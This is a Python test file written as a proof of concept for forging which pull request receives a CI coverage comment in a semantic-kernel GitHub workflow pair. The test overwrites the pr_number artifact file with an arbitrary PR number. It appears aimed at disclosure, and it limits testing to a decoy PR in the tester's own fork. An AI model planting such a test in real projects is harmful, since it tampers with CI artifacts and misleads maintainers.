#py
import os


def test_spoof_pr_number():
    """
    PoC for cross-PR comment forgery (CWE-345) in microsoft/semantic-kernel's
    Python Test Coverage / Python Test Coverage Report workflow pair.

    The producer workflow writes the real PR number to ./pr_number BEFORE
    this test suite runs (cwd = python/, matching the job's
    working-directory: python). Because this test executes after that write
    and before the artifact is uploaded, it can overwrite the file with an
    arbitrary target PR number. The consumer workflow only validates that
    the value is numeric (no cross-check against
    github.event.workflow_run.pull_requests[].number), so it will post the
    coverage report comment on whatever PR number is written here instead
    of the PR that actually triggered the run.

    Replace TARGET_PR_NUMBER with the number of another PR in the SAME
    fork you control (never a PR you don't own) to confirm the
    misdirection safely.
    """
    TARGET_PR_NUMBER = "1"  # <-- set to a decoy PR number in your own fork

    assert os.path.basename(os.getcwd()) in ("python", ""), (
        f"unexpected cwd: {os.getcwd()} -- verify working-directory is still 'python' "
        "before relying on the relative path below"
    )

    with open("pr_number", "w") as f:
        f.write(TARGET_PR_NUMBER)

    assert True
